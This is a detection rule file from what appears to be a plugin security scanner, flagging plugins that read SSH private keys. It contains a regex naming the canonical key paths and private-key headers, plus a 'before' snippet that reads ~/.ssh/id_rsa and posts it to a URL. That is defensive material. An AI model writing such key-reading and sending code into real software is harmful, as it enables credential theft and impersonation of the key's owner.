---
ruleId: SS-PLUGIN-SECRET-EXFIL-SSH-01
severity: high
subScore: security
weight: 25
status: active
shadowUntil: null
appliesTo: [plugin]
frameworks: ["owasp-llm:llm02", "mitre-atlas:AML.T0025", "cwe:200"]
title: >-
  Reads your SSH private key
categoryLabel: >-
  Credential exfiltration
explanation: >-
  This plugin references an SSH private-key path or a private-key file header
  ({match}). An SSH private key authenticates you to servers and Git remotes, so
  code that reads it can impersonate you wherever that key is trusted.
severityRationale: >-
  SSH keys are high-value but their blast radius depends on what they authorize,
  so this is high rather than critical.
remediation:
  action: >-
    Remove the code that reads the private key; delegate authentication to the
    SSH agent or the system git client.
  steps:
    - >-
      Delete any direct read of id_rsa / id_ed25519 or other key files.
    - >-
      Authenticate through the SSH agent or `git` so the private key never enters
      plugin memory or an outbound request.
  saferPattern:
    before: |-
      key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
      requests.post(url, data={"key": key})
    after: |-
      # let the SSH agent / git handle auth; never read or send the key
      subprocess.run(["git", "fetch", remote], check=True)
trigger:
  type: regex_match
  pattern: '(?i)(~/.ssh/id_rsa|~/.ssh/id_ed25519|~/.ssh/id_ecdsa|/\.ssh/id_[a-z]+|BEGIN\s+(?:RSA|OPENSSH|DSA|EC)\s+PRIVATE\s+KEY)'
  scope:
    paths: ['**/*.py', '**/*.ts', '**/*.js', '**/*.mjs', '**/*.cjs', '**/*.go', '**/*.rb', '**/*.java']
limitations:
  - "Legitimate SSH-using plugins (git wrappers, SSH-key-rotation tools) reference the canonical paths."
  - "Cannot detect runtime-resolved key paths (e.g. paths read from config)."
  - "Cannot detect direct memory read of the SSH agent."
priorArt:
  - https://man.openbsd.org/ssh#FILES
  - https://snyk.io/blog/leaking-environment-variables-malicious-package/
  - https://attack.mitre.org/techniques/T1552/004/
---

# SS-PLUGIN-SECRET-EXFIL-SSH-01 — Plugin reads SSH private key files

## Rationale

A plugin that reads SSH private keys from the canonical filesystem
locations or embeds a private-key file format header (`BEGIN ... PRIVATE
KEY`) is engaging in either SSH-key-rotation tooling (rare in plugin
form) or credential exfiltration. MITRE ATT&CK T1552.004 (Private Keys)
catalogues the pattern.

High severity (not critical) reflects the secondary exposure path: SSH
keys are valuable but not always directly cloud-credentials-equivalent;
the impact depends on what the keys authorize. Active at landing — the
pattern set is canonical and FP risk is bounded.

## False positive history

(date-stamped log; updated by FP-audit harness and vendor-appeal outcomes)

## Version history

- v1 (Phase A 2026-W2): initial rule. Active at landing.
